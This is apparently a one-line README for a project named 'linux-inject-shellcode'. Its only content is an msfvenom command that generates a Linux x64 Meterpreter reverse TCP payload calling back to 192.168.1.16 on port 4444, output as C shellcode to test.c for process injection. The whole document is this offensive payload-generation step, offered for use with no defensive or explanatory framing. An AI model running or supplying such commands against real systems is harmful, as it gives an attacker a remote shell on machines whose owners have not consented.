# linux-inject-shellcode
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.16 LPORT=4444 -f c -o test.c
